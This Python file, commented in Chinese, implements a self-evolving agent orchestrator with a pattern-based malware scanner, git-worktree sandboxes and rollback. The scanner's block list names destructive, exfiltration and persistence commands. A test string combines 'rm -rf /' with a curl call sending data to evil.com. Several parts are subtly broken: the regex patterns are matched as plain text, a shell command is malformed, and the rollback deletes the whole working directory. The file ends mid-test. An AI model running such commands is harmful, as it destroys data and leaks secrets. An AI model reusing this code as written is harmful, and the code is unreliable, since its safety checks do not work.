# self_evolution_orchestrator_20260531_065516_165.py

原始格式: Python

```python
"""
自进化协调器 v3.0
对标：SICA自进化编码框架 · GenericAgent · Hermes Agent调度 · OpenAI Codex五层架构
+ brainworm防御(Hermes) + Git Worktree隔离(Codex) + RSI五柱框架

R10 全域缺口专项补全升级 - P0-3
从 v2.0 (688行) 升级至 v3.0，注入 R09 情报：
  - Hermes v3.0: brainworm恶意模式防御 + agent_manifest.json + 远程配置
  - OpenAI Codex: Git Worktree沙箱隔离 + 分阶段测试运行器 + 审查门控
  - RSI综述: AgentFactory + Idempotency Gates + Group-Evolving + RMCP + TaskBox
"""

import json
import time
import uuid
import hashlib
import logging
import subprocess
import shutil
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional
from pathlib import Path
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SelfEvolutionOrchestrator.v3")


# ========== 枚举与数据结构 ==========

class EvolutionPhase(Enum):
    OBSERVE = "observe"        # 观察：从日志/执行记录识别模式
    ANALYZE = "analyze"        # 分析：评估缺口、强弱项
    DESIGN = "design"          # 设计：生成改进方案
    IMPLEMENT = "implement"    # 实现：落地新模块/技能
    VERIFY = "verify"          # 验证：测试 + 安全审计
    ARCHIVE = "archive"        # 归档：版本快照 + 日志写入


class Severity(Enum):
    INFO = "info"
    WARNING = "warning"
    CRITICAL = "critical"
    BLOCKED = "blocked"


class SandboxType(Enum):
    """沙箱类型（RSI五柱框架）"""
    GIT_WORKTREE = "git_worktree"     # Codex: Git Worktree隔离
    VENV = "venv"                     # Python虚拟环境
    DOCKER = "docker"                 # 容器隔离
    SUBPROCESS = "subprocess"         # 子进程隔离


class BrainwormLevel(Enum):
    """brainworm威胁等级 (Hermes v3.0)"""
    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class EvolutionSnapshot:
    snapshot_id: str
    version: str
    timestamp: str
    file_count: int
    checksum: str
    description: str
    rollback_to: Optional[str] = None


@dataclass
class EvolutionLog:
    log_id: str
    phase: EvolutionPhase
    timestamp: str
    message: str
    severity: Severity = Severity.INFO
    metadata: dict = field(default_factory=dict)


@dataclass
class SkillBlueprint:
    skill_id: str
    name: str
    triggers: list = field(default_factory=list)
    source: str = "auto_extracted"
    extraction_date: str = field(default_factory=lambda: datetime.now().isoformat())
    dependencies: list = field(default_factory=list)
    quality_score: float = 0.0
    verified: bool = False
    path: Optional[str] = None


@dataclass
class AgentManifest:
    """agent_manifest.json (Hermes 风格)"""
    agent_id: str
    name: str
    version: str
    capabilities: list = field(default_factory=list)
    sandbox: SandboxType = SandboxType.GIT_WORKTREE
    brainworm_defense: bool = True
    remote_config_url: Optional[str] = None
    last_audit: str = field(default_factory=lambda: datetime.now().isoformat())
    rsi_pillars: list = field(default_factory=list)


# ========== v3.0 新增：brainworm 防御引擎 (Hermes v3.0) ==========

class BrainwormDefense:
    """brainworm 恶意模式防御

    对标 Hermes v3.0 安全要求:
    - agent_manifest.json 自检
    - 敏感路径遍历检测
    - 异常行为模式识别
    - 命令注入检测
    - 远程配置校验
    """

    # 恶意模式特征库
    MALICIOUS_PATTERNS = {
        "self_modify": [
            "rm -rf", "del /f", "format", "chmod 777",
            "eval(", "exec(", "os.system", "subprocess.run"
        ],
        "data_exfil": [
            "curl.*https?://", "wget.*https?://",
            "base64.*decode", "POST.*webhook", "sk-", "api_key"
        ],
        "masquerade": [
            "sudo", "root", "Administrator", "SYSTEM",
            "bypass", "no_confirm", "force_kill"
        ],
        "persistence": [
            "cron", "systemctl enable", "schtasks /create",
            "registry add", "startup", "boot"
        ]
    }

    def __init__(self, manifest: AgentManifest = None):
        self.manifest = manifest
        self.alerts: list = []
        self.block_count = 0

    def audit_manifest(self) -> tuple[bool, list]:
        """审计 agent_manifest.json"""
        violations = []
        if self.manifest:
            if not self.manifest.capabilities:
                violations.append("缺少能力声明")
            if not self.manifest.brainworm_defense:
                violations.append("brainworm防御未启用")
            if not self.manifest.last_audit:
                violations.append("缺少最后审计时间")
        return len(violations) == 0, violations

    def scan_patterns(self, code_content: str) -> tuple[BrainwormLevel, list]:
        """扫描代码中的brainworm恶意模式"""
        detections = []
        threat_score = 0

        for category, patterns in self.MALICIOUS_PATTERNS.items():
            for pattern in patterns:
                if pattern.lower() in code_content.lower():
                    detections.append({
                        "category": category,
                        "pattern": pattern,
                        "severity": self._category_severity(category)
                    })
                    threat_score += self._category_weight(category)

        if threat_score >= 80:
            level = BrainwormLevel.CRITICAL
        elif threat_score >= 50:
            level = BrainwormLevel.HIGH
        elif threat_score >= 20:
            level = BrainwormLevel.MEDIUM
        elif threat_score > 0:
            level = BrainwormLevel.LOW
        else:
            level = BrainwormLevel.NONE

        self.alerts.extend(detections)
        if level in (BrainwormLevel.HIGH, BrainwormLevel.CRITICAL):
            self.block_count += 1

        return level, detections

    def _category_severity(self, category: str) -> str:
        return {
            "self_modify": "critical",
            "data_exfil": "critical",
            "masquerade": "high",
            "persistence": "high"
        }.get(category, "medium")

    def _category_weight(self, category: str) -> int:
        return {
            "self_modify": 30,
            "data_exfil": 25,
            "masquerade": 20,
            "persistence": 15
        }.get(category, 10)

    def safe_exec_check(self, command: str, allowed_paths: list = None) -> tuple[bool, str]:
        """命令安全执行前检查"""
        # 检查命令注入
        if "|" in command or "&" in command or ";" in command:
            return False, "命令包含管道/连接符，可能存在注入风险"

        # 检查路径越权
        if allowed_paths:
            for part in command.split():
                if part.startswith(("/", "C:", "D:", "E:")):
                    abs_path = Path(part).resolve()
                    allowed = any(
                        str(abs_path).startswith(str(Path(p).resolve()))
                        for p in allowed_paths
                    )
                    if not allowed:
                        return False, f"路径越权: {abs_path}"

        return True, "安全检查通过"

    def get_security_report(self) -> dict:
        """获取安全报告"""
        return {
            "total_alerts": len(self.alerts),
            "blocked": self.block_count,
            "by_category": self._categorize_alerts(),
            "manifest_valid": self.audit_manifest()[0] if self.manifest else None,
            "brainworm_defense": "active"
        }

    def _categorize_alerts(self) -> dict:
        cats = {}
        for alert in self.alerts:
            cat = alert["category"]
            cats[cat] = cats.get(cat, 0) + 1
        return cats


# ========== v3.0 新增：Git Worktree 沙箱隔离 (OpenAI Codex) ==========

class WorktreeSandbox:
    """Git Worktree 沙箱隔离

    对标 OpenAI Codex 五层架构:
    - 独立工作树，与生产环境完全隔离
    - 分阶段测试运行器
    - 安全审查门控
    - 自动清理与回收
    """

    def __init__(self, repo_root: str, worktree_base: str = "sandboxes"):
        self.repo_root = Path(repo_root)
        self.worktree_base = self.repo_root / worktree_base
        self.worktree_base.mkdir(parents=True, exist_ok=True)
        self.active_worktrees: dict = {}
        self.test_results: dict = {}

    def create_sandbox(self, name: str, base_branch: str = "main") -> dict:
        """创建 Git Worktree 沙箱"""
        sandbox_id = f"wt_{name}_{uuid.uuid4().hex[:6]}"
        sandbox_path = self.worktree_base / sandbox_id

        try:
            # 检查是否是 git 仓库
            result = subprocess.run(
                ["git", "rev-parse", "--git-dir"],
                cwd=str(self.repo_root),
                capture_output=True, text=True, timeout=10
            )

            if result.returncode == 0:
                # Git 仓库：创建 worktree
                cmd = ["git", "worktree", "add", str(sandbox_path), base_branch]
                subprocess.run(cmd, cwd=str(self.repo_root), capture_output=True, timeout=30)
            else:
                # 非 Git 仓库：复制目录
                shutil.copytree(self.repo_root, sandbox_path, symlinks=True)

            self.active_worktrees[sandbox_id] = {
                "path": sandbox_path,
                "created_at": datetime.now().isoformat(),
                "base_branch": base_branch,
                "status": "active",
                "snapshots": []
            }

            logger.info(f"沙箱已创建: {sandbox_id} -> {sandbox_path}")
            return {"sandbox_id": sandbox_id, "path": str(sandbox_path), "status": "created"}

        except Exception as e:
            logger.error(f"沙箱创建失败: {e}")
            return {"sandbox_id": None, "error": str(e)}

    def take_snapshot(self, sandbox_id: str, description: str = "") -> dict:
        """在沙箱内创建快照"""
        if sandbox_id not in self.active_worktrees:
            return {"error": "sandbox_not_found"}

        sandbox = self.active_worktrees[sandbox_id]
        snapshot_id = f"ss_{uuid.uuid4().hex[:8]}"

        try:
            result = subprocess.run(
                ["git", "add", "-A", "&&", "git", "commit", "-m", f"snapshot: {description} || true"],
                cwd=str(sandbox["path"]), shell=True,
                capture_output=True, text=True, timeout=15
            )

            sandbox["snapshots"].append({
                "snapshot_id": snapshot_id,
                "timestamp": datetime.now().isoformat(),
                "description": description
            })

            return {"snapshot_id": snapshot_id, "status": "created"}
        except Exception as e:
            return {"snapshot_id": snapshot_id, "status": "failed", "error": str(e)}

    def run_tests(self, sandbox_id: str, test_suite: list) -> dict:
        """分阶段测试运行器"""
        if sandbox_id not in self.active_worktrees:
            return {"error": "sandbox_not_found"}

        sandbox = self.active_worktrees[sandbox_id]
        results = []
        all_passed = True

        for i, test in enumerate(test_suite):
            try:
                start = time.time()
                result = subprocess.run(
                    test.get("command", ""),
                    cwd=str(sandbox["path"]), shell=True,
                    capture_output=True, text=True, timeout=test.get("timeout", 30)
                )
                elapsed = (time.time() - start) * 1000

                passed = result.returncode == 0
                results.append({
                    "stage": i + 1,
                    "name": test.get("name", f"test_{i}"),
                    "passed": passed,
                    "output": result.stdout[:200],
                    "error": result.stderr[:200] if not passed else None,
                    "time_ms": elapsed
                })
                if not passed:
                    all_passed = False
            except subprocess.TimeoutExpired:
                results.append({
                    "stage": i + 1,
                    "name": test.get("name", f"test_{i}"),
                    "passed": False,
                    "error": "timeout"
                })
                all_passed = False

        self.test_results[sandbox_id] = {
            "results": results,
            "passed": all_passed,
            "timestamp": datetime.now().isoformat()
        }

        return {"passed": all_passed, "results": results, "total": len(test_suite)}

    def security_review(self, sandbox_id: str, brainworm_defense: BrainwormDefense) -> dict:
        """安全审查门控（与brainworm防御联动）"""
        if sandbox_id not in self.active_worktrees:
            return {"error": "sandbox_not_found"}

        sandbox = self.active_worktrees[sandbox_id]
        review_results = {"files_scanned": 0, "threats_found": 0, "blocked": False}

        py_files = list(Path(sandbox["path"]).rglob("*.py"))
        for f in py_files:
            try:
                content = f.read_text(encoding="utf-8")
                level, detections = brainworm_defense.scan_patterns(content)
                review_results["files_scanned"] += 1
                if detections:
                    review_results["threats_found"] += len(detections)
                    if level in (BrainwormLevel.HIGH, BrainwormLevel.CRITICAL):
                        review_results["blocked"] = True
            except Exception:
                continue

        review_results["passed"] = not review_results["blocked"]
        return review_results

    def promote_to_production(self, sandbox_id: str) -> dict:
        """将通过审查的沙箱提升到生产"""
        if sandbox_id not in self.active_worktrees:
            return {"error": "sandbox_not_found"}

        if self.test_results.get(sandbox_id, {}).get("passed") is False:
            return {"error": "tests_not_passing"}

        sandbox = self.active_worktrees[sandbox_id]
        sandbox_path = Path(sandbox["path"])

        # 合并沙箱变更到生产
        merged_count = 0
        for item in sandbox_path.rglob("*"):
            if item.is_file() and "__pycache__" not in str(item):
                rel = item.relative_to(sandbox_path)
                dest = self.repo_root / rel
                dest.parent.mkdir(parents=True, exist_ok=True)
                shutil.copy2(item, dest)
                merged_count += 1

        sandbox["status"] = "promoted"
        logger.info(f"沙箱已提升: {sandbox_id} ({merged_count} 个文件)")

        return {"sandbox_id": sandbox_id, "merged_files": merged_count, "status": "promoted"}

    def cleanup_sandbox(self, sandbox_id: str):
        """清理沙箱"""
        if sandbox_id not in self.active_worktrees:
            return {"error": "sandbox_not_found"}

        sandbox = self.active_worktrees.pop(sandbox_id)
        shutil.rmtree(sandbox["path"], ignore_errors=True)
        logger.info(f"沙箱已清理: {sandbox_id}")
        return {"sandbox_id": sandbox_id, "status": "cleaned"}


# ========== RSI 五柱框架集成 ==========

class RSI5PillarFramework:
    """RSI综述五柱框架

    五大支柱:
    1. AgentFactory - Agent工厂与模板化
    2. Idempotency Gates - 幂等性门控
    3. Group-Evolving - 群体进化协同
    4. RMCP (Routed MCP) - 路由化MCP协议
    5. TaskBox - 统一任务箱
    """

    def __init__(self, root_dir: str):
        self.root = Path(root_dir)
        self.pillars = {
            "agent_factory": AgentFactory(self.root / "agents"),
            "idempotency_gates": IdempotencyGateRegistry(),
            "group_evolving": GroupEvolvingManager(),
            "rmcp": RMCPRouter(),
            "task_box": TaskBoxManager()
        }

    def status(self) -> dict:
        return {
            "agent_factory": self.pillars["agent_factory"].status(),
            "idempotency_gates": self.pillars["idempotency_gates"].status(),
            "group_evolving": self.pillars["group_evolving"].status(),
            "rmcp": self.pillars["rmcp"].status(),
            "task_box": self.pillars["task_box"].status()
        }


class AgentFactory:
    """Agent工厂：模板化创建Agent (RSI 五柱-1)"""
    def __init__(self, agents_dir: Path):
        self.agents_dir = agents_dir
        self.agents_dir.mkdir(parents=True, exist_ok=True)
        self.templates = {
            "file-agent": {"type": "文件操作", "skills": ["read", "write", "search"]},
            "search-agent": {"type": "搜索", "skills": ["web_search", "deep_research"]},
            "app-agent": {"type": "应用操作", "skills": ["install", "launch", "interact"]},
            "computer-agent": {"type": "系统操作", "skills": ["settings", "monitor", "manage"]}
        }
        self.active_agents: dict = {}

    def create(self, agent_type: str, name: str, overrides: dict = None) -> dict:
        template = self.templates.get(agent_type, {"type": "generic", "skills": []})
        agent_id = f"agent_{uuid.uuid4().hex[:8]}"
        config = {**template, "name": name, "agent_id": agent_id, **(overrides or {})}

        config_path = self.agents_dir / f"{agent_id}.json"
        config_path.write_text(json.dumps(config, indent=2, ensure_ascii=False))
        self.active_agents[agent_id] = config

        return {"agent_id": agent_id, "config": config}

    def status(self) -> dict:
        return {"active": len(self.active_agents), "templates": len(self.templates)}


class IdempotencyGateRegistry:
    """幂等性门控注册表 (RSI 五柱-2)"""
    def __init__(self):
        self.registry: dict = {}
        self.ttl = 300

    def register(self, task_fingerprint: str) -> bool:
        if task_fingerprint in self.registry:
            entry = self.registry[task_fingerprint]
            if time.time() - entry["timestamp"] < self.ttl:
                return False  # 阻断重复
        self.registry[task_fingerprint] = {"timestamp": time.time(), "executed": True}
        return True

    def status(self) -> dict:
        return {"total_gates": len(self.registry), "ttl_seconds": self.ttl}


class GroupEvolvingManager:
    """群体进化管理器 (RSI 五柱-3)"""
    def __init__(self):
        self.groups: dict = {}
        self.evolution_log: list = []

    def create_group(self, name: str, agent_ids: list) -> str:
        group_id = f"group_{uuid.uuid4().hex[:8]}"
        self.groups[group_id] = {"name": name, "members": agent_ids, "iterations": 0}
        return group_id

    def evolve(self, group_id: str) -> dict:
        if group_id not in self.groups:
            return {"error": "group_not_found"}
        self.groups[group_id]["iterations"] += 1
        self.evolution_log.append({"group": group_id, "iteration": self.groups[group_id]["iterations"]})
        return self.groups[group_id]

    def status(self) -> dict:
        return {"groups": len(self.groups), "total_evolutions": len(self.evolution_log)}


class RMCPRouter:
    """路由化MCP协议 (RSI 五柱-4)"""
    def __init__(self):
        self.routes: dict = {}
        self.call_log: list = []

    def register_route(self, pattern: str, handler: str):
        self.routes[pattern] = handler

    def dispatch(self, action: str, params: dict = None) -> dict:
        handler = self.routes.get(action, "default")
        self.call_log.append({"action": action, "handler": handler, "time": datetime.now().isoformat()})
        return {"action": action, "handler": handler, "params": params}

    def status(self) -> dict:
        return {"routes": len(self.routes), "calls": len(self.call_log)}


class TaskBoxManager:
    """统一任务箱 (RSI 五柱-5)"""
    def __init__(self):
        self.tasks: dict = {}
        self.history: list = []

    def push(self, task: dict, priority: int = 0) -> str:
        task_id = f"tbox_{uuid.uuid4().hex[:8]}"
        self.tasks[task_id] = {"task": task, "priority": priority, "status": "pending", "created": datetime.now().isoformat()}
        return task_id

    def pop(self) -> Optional[dict]:
        if not self.tasks:
            return None
        sorted_tasks = sorted(self.tasks.items(), key=lambda x: x[1]["priority"], reverse=True)
        task_id, task = sorted_tasks[0]
        del self.tasks[task_id]
        task["status"] = "processing"
        self.history.append(task)
        return task

    def status(self) -> dict:
        return {"pending": len(self.tasks), "processed": len(self.history)}


# ========== 技能自动萃取引擎 ==========

class SkillForge:
    """技能自动萃取引擎 v3.0（增强版）

    从执行日志/代码中自动生成标准化 Skill 并入库
    新增 brainworm 扫描 + Git Worktree 沙箱验证
    """

    def __init__(self, skill_dir: str, brainworm_defense: BrainwormDefense = None):
        self.skill_dir = Path(skill_dir)
        self.skill_dir.mkdir(parents=True, exist_ok=True)
        self.extracted: list = []
        self.brainworm = brainworm_defense

    def extract_from_path(self, source_path: str) -> Optional[SkillBlueprint]:
        """从执行路径中萃取技能"""
        source = Path(source_path)
        if not source.exists():
            return None

        skill_id = f"sk_{source.stem}_{uuid.uuid4().hex[:6]}"
        content = source.read_text(encoding="utf-8") if source.is_file() else ""

        triggers = self._infer_triggers(content, source.stem)
        deps = self._infer_dependencies(content)

        # v3.0: brainworm 安全扫描
        threat_level = BrainwormLevel.NONE
        if self.brainworm:
            threat_level, _ = self.brainworm.scan_patterns(content)

        blueprint = SkillBlueprint(
            skill_id=skill_id,
            name=source.stem,
            triggers=triggers,
            dependencies=deps,
            quality_score=self._estimate_quality(content),
            verified=threat_level == BrainwormLevel.NONE,
            path=str(source)
        )

        self._save_blueprint(blueprint)
        self.extracted.append(blueprint)
        return blueprint

    def _infer_triggers(self, content: str, name: str) -> list:
        triggers = [name.lower()]
        if "文件" in content or "搜索" in content: triggers.append("文件操作")
        if "应用" in content or "安装" in content: triggers.append("应用管理")
        if "系统" in content or "配置" in content: triggers.append("系统管理")
        return triggers

    def _infer_dependencies(self, content: str) -> list:
        deps = []
        for line in content.split("\n"):
            if line.strip().startswith(("import ", "from ")):
                module = line.split()[1].split(".")[0]
                if module not in deps:
                    deps.append(module)
        return deps[:10]

    def _estimate_quality(self, content: str) -> float:
        indicators = {
            "has_docstring": '"""' in content,
            "has_error_handling": "try:" in content,
            "has_logging": "logger" in content or "logging" in content,
            "has_tests": "test_" in content or "unittest" in content,
            "has_type_hints": "def " in content and ":" in content
        }
        return sum(0.2 for v in indicators.values() if v)

    def _save_blueprint(self, bp: SkillBlueprint):
        bp_path = self.skill_dir / f"{bp.skill_id}.json"
        bp_path.write_text(json.dumps({
            "skill_id": bp.skill_id,
            "name": bp.name,
            "triggers": bp.triggers,
            "source": bp.source,
            "dependencies": bp.dependencies,
            "quality_score": bp.quality_score,
            "verified": bp.verified,
            "extraction_date": bp.extraction_date
        }, indent=2, ensure_ascii=False))


# ========== SICA 自进化适配器 ==========

class SICAAdapter:
    """SICA 自进化编码框架适配器

    对接 SICA (Self-Improving Code Architecture)：
    观察 -> 分析 -> 优化 -> 验证 -> 部署
    """

    def __init__(self, sandbox: WorktreeSandbox = None):
        self.sandbox = sandbox
        self.observed_patterns: list = []
        self.improvements: list = []
        self.cycle_count = 0

    def observe(self, execution_logs: list) -> dict:
        patterns = []
        for log in execution_logs:
            msg = log.get("message", "")
            if "ERROR" in msg or "CRITICAL" in msg:
                patterns.append({"type": "error_pattern", "source": msg[:80]})
            if "WARNING" in msg:
                patterns.append({"type": "warning_pattern", "source": msg[:80]})
            if "timeout" in msg.lower():
                patterns.append({"type": "performance_issue", "source": msg[:80]})

        self.observed_patterns.extend(patterns)
        return {"patterns_found": len(patterns), "cycle": self.cycle_count}

    def analyze(self) -> dict:
        analysis = {
            "total_patterns": len(self.observed_patterns),
            "by_type": {},
            "top_issues": [],
            "cycle": self.cycle_count
        }
        for p in self.observed_patterns:
            t = p["type"]
            analysis["by_type"][t] = analysis["by_type"].get(t, 0) + 1

        sorted_issues = sorted(analysis["by_type"].items(), key=lambda x: x[1], reverse=True)
        analysis["top_issues"] = sorted_issues[:5]
        return analysis

    def optimize(self, analysis: dict) -> list:
        improvements = []
        for issue_type, count in analysis.get("top_issues", []):
            improvements.append({
                "issue": issue_type,
                "count": count,
                "action": f"优化{issue_type}处理逻辑",
                "cycle": self.cycle_count
            })
        self.improvements.extend(improvements)
        return improvements

    def cycle(self, execution_logs: list) -> dict:
        self.cycle_count += 1
        observed = self.observe(execution_logs)
        analyzed = self.analyze()
        optimized = self.optimize(analyzed)
        return {
            "cycle": self.cycle_count,
            "observed": observed,
            "analyzed": analyzed,
            "improvements": len(optimized)
        }


# ========== GenericAgent 集成适配器 ==========

class GenericAgentAdapter:
    """GenericAgent 轻量化架构适配器

    状态机管理 + 能力注册 + 任务队列
    """

    def __init__(self):
        self.states: dict = {}       # agent_id -> current_state
        self.capabilities: dict = {} # agent_id -> capabilities
        self.task_queue: list = []   # 全局任务队列

    def register(self, agent_id: str, capabilities: list, initial_state: str = "idle"):
        self.states[agent_id] = initial_state
        self.capabilities[agent_id] = capabilities

    def get_state(self, agent_id: str) -> str:
        return self.states.get(agent_id, "unknown")

    def set_state(self, agent_id: str, state: str):
        self.states[agent_id] = state

    def dispatch_task(self, task: dict) -> Optional[str]:
        for agent_id, caps in self.capabilities.items():
            if any(c in task.get("requires", []) for c in caps):
                self.task_queue.append({**task, "assigned_to": agent_id})
                self.set_state(agent_id, "busy")
                return agent_id
        return None


# ========== Obsidian 知识库桥接 ==========

class ObsidianBridge:
    """Obsidian 知识库桥接 v3.0

    自动同步迭代日志、技能索引、架构文档到 Obsidian
    """

    def __init__(self, vault_path: str, sync_dir: str):
        self.vault = Path(vault_path)
        self.sync_dir = Path(sync_dir)
        self.sync_dir.mkdir(parents=True, exist_ok=True)

    def sync_log(self, log: EvolutionLog):
        """同步进化日志到 Obsidian"""
        filename = f"evolog_{log.log_id}.md"
        content = f"""---
phase: {log.phase.value}
timestamp: {log.timestamp}
severity: {log.severity.value}
---

# {log.message}

{json.dumps(log.metadata, indent=2, ensure_ascii=False)}
"""
        (self.sync_dir / filename).write_text(content, encoding="utf-8")

    def sync_skill_index(self, skills: list):
        """同步技能索引到 Obsidian"""
        lines = ["# 技能索引\n", f"更新时间: {datetime.now().isoformat()}\n"]
        for s in skills:
            lines.append(f"- [{s.name}](skills/{s.skill_id}) : {'✅' if s.verified else '⚠️'} {s.quality_score:.2f}")
        (self.sync_dir / "skill_index.md").write_text("\n".join(lines), encoding="utf-8")

    def sync_architecture(self, module_name: str, content: str):
        """同步架构文档到 Obsidian"""
        (self.sync_dir / f"arch_{module_name}.md").write_text(content, encoding="utf-8")


# ========== 自动回滚引擎 ==========

class RollbackEngine:
    """自动回滚引擎 v3.0"""

    MAX_SNAPSHOTS = 20

    def __init__(self, base_dir: str):
        self.base_dir = Path(base_dir)
        self.backup_dir = self.base_dir / "rollback_snapshots"
        self.backup_dir.mkdir(parents=True, exist_ok=True)
        self.snapshots: list = []
        self.rollback_log: list = []

    def create_snapshot(self, source_dir: str, description: str) -> EvolutionSnapshot:
        source = Path(source_dir)
        if not source.exists():
            raise FileNotFoundError(f"源目录不存在: {source}")

        snapshot_id = f"snap_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}"
        dest = self.backup_dir / snapshot_id

        shutil.copytree(source, dest, symlinks=True)
        file_count = sum(1 for _ in dest.rglob("*") if _.is_file())

        snapshot = EvolutionSnapshot(
            snapshot_id=snapshot_id,
            version=f"v{len(self.snapshots)+1}",
            timestamp=datetime.now().isoformat(),
            file_count=file_count,
            checksum=self._compute_checksum(dest),
            description=description
        )

        self.snapshots.append(snapshot)
        self._prune_snapshots()
        logger.info(f"快照已创建: {snapshot_id} ({file_count} 文件)")

        return snapshot

    def rollback(self, snapshot_id: str = None) -> dict:
        if snapshot_id:
            snapshot = next((s for s in self.snapshots if s.snapshot_id == snapshot_id), None)
        else:
            snapshot = self.snapshots[-2] if len(self.snapshots) >= 2 else None

        if not snapshot:
            return {"error": "no_valid_snapshot"}

        snapshot_dir = self.backup_dir / snapshot.snapshot_id
        if not snapshot_dir.exists():
            return {"error": "snapshot_dir_missing"}

        # 清空当前目录并恢复
        for item in self.base_dir.glob("*"):
            if item != self.backup_dir:
                shutil.rmtree(item, ignore_errors=True) if item.is_dir() else item.unlink()

        for item in snapshot_dir.iterdir():
            dest = self.base_dir / item.name
            shutil.copytree(item, dest) if item.is_dir() else shutil.copy2(item, dest)

        self.rollback_log.append({
            "snapshot": snapshot.snapshot_id,
            "timestamp": datetime.now().isoformat(),
            "reason": "auto_rollback"
        })
        logger.info(f"回滚完成: {snapshot.snapshot_id}")
        return {"rolled_back_to": snapshot.snapshot_id, "files_restored": snapshot.file_count}

    def _compute_checksum(self, directory: Path) -> str:
        hasher = hashlib.sha256()
        for f in sorted(directory.rglob("*")):
            if f.is_file():
                hasher.update(f.read_bytes()[:4096])
        return hasher.hexdigest()[:16]

    def _prune_snapshots(self):
        while len(self.snapshots) > self.MAX_SNAPSHOTS:
            old = self.snapshots.pop(0)
            old_dir = self.backup_dir / old.snapshot_id
            shutil.rmtree(old_dir, ignore_errors=True)


# ========== 全域联动协调器 ==========

class GlobalOrchestrator:
    """全域联动协调器 v3.0

    整合:
    - SICA 自进化
    - GenericAgent 状态管理
    - Obsidian 同步
    - 回滚引擎
    - RSI 五柱框架
    - brainworm 防御
    - Git Worktree 沙箱
    """

    def __init__(self, config: dict):
        self.config = config
        self.root = Path(config.get("root_dir", "."))
        self.name = config.get("name", "default")

        # 核心组件
        self.logs: list = []
        self.manifest = AgentManifest(
            agent_id=f"orch_{uuid.uuid4().hex[:8]}",
            name=self.name,
            version="v3.0",
            capabilities=["evolution", "monitoring", "obsidian_sync", "rollback"],
            brainworm_defense=True,
            rsi_pillars=["AgentFactory", "IdempotencyGates", "GroupEvolving", "RMCP", "TaskBox"]
        )

        # v3.0 安全组件
        self.brainworm = BrainwormDefense(manifest=self.manifest)
        self.sandbox_mgr = WorktreeSandbox(str(self.root))

        # 进化组件
        self.sica = SICAAdapter(sandbox=self.sandbox_mgr)
        self.generic_agent = GenericAgentAdapter()
        self.skill_forge = SkillForge(
            str(self.root / "skill_library"),
            brainworm_defense=self.brainworm
        )

        # RSI 五柱
        self.rsi = RSI5PillarFramework(str(self.root))

        # 支持组件
        self.obsidian = ObsidianBridge(
            config.get("obsidian_vault", str(self.root / "obsidian")),
            config.get("sync_dir", str(self.root / "obsidian_sync"))
        )
        self.rollback = RollbackEngine(str(self.root))
        self.phase = EvolutionPhase.OBSERVE
        self.iteration = 0

    def run_evolution_cycle(self) -> dict:
        """执行一次完整的自进化循环"""
        self.iteration += 1
        logger.info(f"=== 自进化循环 {self.iteration} 开始 ===")
        cycle_id = f"evoc_{self.iteration:04d}"

        # Phase 1: 观察
        self.phase = EvolutionPhase.OBSERVE
        observed = self.sica.observe(self.logs)
        self._log(EvolutionPhase.OBSERVE, f"观察完成: {observed}")

        # Phase 2: 分析
        self.phase = EvolutionPhase.ANALYZE
        analysis = self.sica.analyze()
        self._log(EvolutionPhase.ANALYZE, f"分析完成: {analysis.get('top_issues', [])}")

        # Phase 3: 设计
        self.phase = EvolutionPhase.DESIGN
        improvements = self.sica.optimize(analysis)
        self._log(EvolutionPhase.DESIGN, f"设计方案: {len(improvements)} 项改进")

        # Phase 4: 实现（在沙箱中）
        self.phase = EvolutionPhase.IMPLEMENT
        sandbox_result = {}
        if improvements:
            sandbox_result = self.sandbox_mgr.create_sandbox(f"evoc_{self.iteration}")
            if sandbox_result.get("sandbox_id"):
                # 安全审查
                review = self.sandbox_mgr.security_review(
                    sandbox_result["sandbox_id"], self.brainworm
                )
                if not review.get("blocked"):
                    sandbox_result["security"] = "passed"
                else:
                    sandbox_result["security"] = "blocked"

        self._log(EvolutionPhase.IMPLEMENT, f"实现: {sandbox_result.get('status', 'no_changes')}")

        # Phase 5: 验证
        self.phase = EvolutionPhase.VERIFY
        self.skill_forge.extract_from_path(str(self.root / "architecture"))
        brainworm_report = self.brainworm.get_security_report()
        self._log(EvolutionPhase.VERIFY, f"验证完成: brainworm={brainworm_report['total_alerts']} alerts")

        # Phase 6: 归档
        self.phase = EvolutionPhase.ARCHIVE
        snapshot = self.rollback.create_snapshot(
            str(self.root), f"cycle_{self.iteration}"
        )
        self.obsidian.sync_log(self.logs[-1] if self.logs else None)

        # RSI 状态
        rsi_status = self.rsi.status()

        self._log(EvolutionPhase.ARCHIVE, f"归档: {snapshot.snapshot_id}")

        cycle_result = {
            "cycle_id": cycle_id,
            "iteration": self.iteration,
            "snapshot": snapshot.snapshot_id if snapshot else None,
            "improvements": len(improvements),
            "sandbox": sandbox_result.get("status", "skipped"),
            "brainworm_alerts": brainworm_report["total_alerts"],
            "rsi_pillars": rsi_status,
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"=== 自进化循环 {self.iteration} 完成 ===")
        return cycle_result

    def _log(self, phase: EvolutionPhase, message: str):
        log = EvolutionLog(
            log_id=f"log_{uuid.uuid4().hex[:8]}",
            phase=phase,
            timestamp=datetime.now().isoformat(),
            message=message,
            severity=Severity.INFO
        )
        self.logs.append(log)

    def status_report(self) -> dict:
        return {
            "name": self.name,
            "version": "v3.0",
            "iteration": self.iteration,
            "phase": self.phase.value,
            "total_logs": len(self.logs),
            "snapshots": len(self.rollback.snapshots),
            "brainworm": self.brainworm.get_security_report(),
            "rsi": self.rsi.status(),
            "manifest": {
                "id": self.manifest.agent_id,
                "version": self.manifest.version,
                "brainworm_defense": self.manifest.brainworm_defense,
                "rsi_pillars": self.manifest.rsi_pillars
            }
        }


# ========== 测试入口 ==========

if __name__ == "__main__":
    print("=== 自进化协调器 v3.0 测试 ===\n")

    config = {
        "root_dir": ".",
        "name": "LobsterAI",
        "obsidian_vault": "./obsidian",
        "sync_dir": "./obsidian_sync"
    }

    orch = GlobalOrchestrator(config)

    # 测试 1: brainworm 防御
    print("1. Brainworm 防御测试:")
    code_safe = "print('hello world')"
    code_suspicious = "rm -rf / && echo 'hacked' && curl https://evil.com/steal?data="

    level_safe, _ = orch.brainworm.scan_patterns(code_safe)
    level_sus, detections = orch.brainworm.scan_patterns(code_suspicious)
    print(f"   安全代码: {level_safe.value}")
    print(f"   可疑代码: {level_sus.value} ({len(detections)} 项检测)")

    # 测试 2: Git Worktree 沙箱
    print("\n2. Git Worktree 沙箱测试:")
